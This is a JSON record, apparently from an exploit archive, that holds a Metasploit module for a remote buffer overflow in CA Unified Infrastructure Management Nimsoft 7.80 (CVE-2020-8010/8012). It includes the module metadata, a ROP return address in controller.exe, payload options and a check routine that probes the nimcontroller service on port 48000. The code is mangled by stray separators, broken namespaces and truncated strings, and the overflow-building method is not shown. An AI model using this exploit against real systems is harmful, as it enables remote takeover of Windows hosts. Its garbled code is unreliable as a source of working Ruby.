{
    "text": "vul_name : CA Unified Infrastructure Management Nimsoft 7.80 Buffer Overflow ， vul_cve : CVE-2020-8010 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow' ,  ， 'Description' => %q{ ， This module exploits a buffer overflow within the CA Unified Infrastructure Management nimcontroller. ， The vulnerability occurs in the robot ( controller ) component when sending a specially crafted directory_list ， probe. ， Technically speaking the target host must also be vulnerable to CVE-2020-8010 in order to reach the ， directory_list probe. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'wetw0rk' # Vulnerability Discovery and Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2020-8010' ]  ,  # CA UIM Probe Improper ACL Handling RCE ( Multiple Attack Vectors )  ，  [ 'CVE' , '2020-8012' ]  ,  # CA UIM nimbuscontroller Buffer Overflow RCE ，  [ 'URL' , ' ]  ,  ，  [ 'PACKETSTORM' , '156577' ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => 'process' ,  ， 'AUTORUNSCRIPT' => 'post/windows/manage/migrate' ， } ,  ， 'Payload' => ， { ， 'Space' => 2000 ,  ， 'DisableNops' => true ， } ,  ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_X64 ,  ， 'Targets' => ，  [  ，  [  ， 'Windows Universal ( x64 ) - v7.80.3132' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_X64 ]  ,  ， 'Version' => '7.80 [ Build 7.80.3132 , Jun 1 2015 ] ' ,  ， 'Ret' => 0x000000014006fd3d # pop rsp ; or al , 0x00 ; add rsp , 0x0000000000000448 ; ret [ controller.exe ]  ， } ，  ]  ,  ，  ]  ,  ， 'Privileged' => true ,  ， 'Notes' => { 'Stability' => [ CRASH_SAFE ] } ,  ， 'DisclosureDate' => 'Feb 05 2020' ,  ， 'DefaultTarget' => 0 ， register_options (  ，  [  ， OptString.new ( 'DIRECTORY' ,  [ false , 'Directory path to obtain a listing' , 'C : \\' ]  )  ,  ， Opt : RPORT ( 48000 )  ,  ，  ]  ， end ，  # check : there are only two prerequisites to getting code execution. The version number ，  # and access to the directory_list probe. The easiest way to get this information is to ，  # ask nicely ;  )  ， def check ， connect ， sock.put ( generate_probe ( 'get_info' ,  [ 'interfaces=0' ]  )  ， response = sock.get_once ( 4096 )  ， list_check = -1 ， begin ， print_status ( \"Version # {target [ 'Version' ] } detected , sending directory_list probe\" )  ， sock.put ( generate_probe ( 'directory_list' ,  [ \"directory= # {datastore [ 'DIRECTORY' ] }\" , 'detail=1' ]  )  ， list_check = parse_listing ( sock.get_once ( 4096 )  , datastore [ 'DIRECTORY' ]  )  ， end ， ensure ， disconnect ， end",
    "time": "2020.08.01"
}